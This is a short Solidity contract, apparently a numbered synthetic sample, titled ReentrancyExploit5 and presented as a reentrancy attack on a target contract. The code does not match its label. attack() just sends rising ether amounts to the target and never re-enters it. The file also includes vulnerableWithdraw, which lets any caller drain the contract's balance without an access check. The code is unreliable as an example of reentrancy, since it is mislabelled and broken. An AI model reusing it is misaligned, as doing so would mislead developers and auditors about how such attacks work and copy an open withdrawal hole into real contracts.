pragma solidity ^0.8.0;

contract ReentrancyExploit5 {
    address public target;
    
    constructor(address _target) {
        target = _target;
    }
    
    function attack() public payable {
        // Exploit: Reentrancy attack with varying amounts
        uint amountToSend = 0.1 ether;
        while (amountToSend < msg.value) {
            (bool success, ) = target.call{value: amountToSend}("");
            require(success, "Call failed");
            amountToSend += 0.1 ether;
        }
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function vulnerableWithdraw(uint amount) public {
        require(amount <= address(this).balance, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    fallback() external payable {}
}
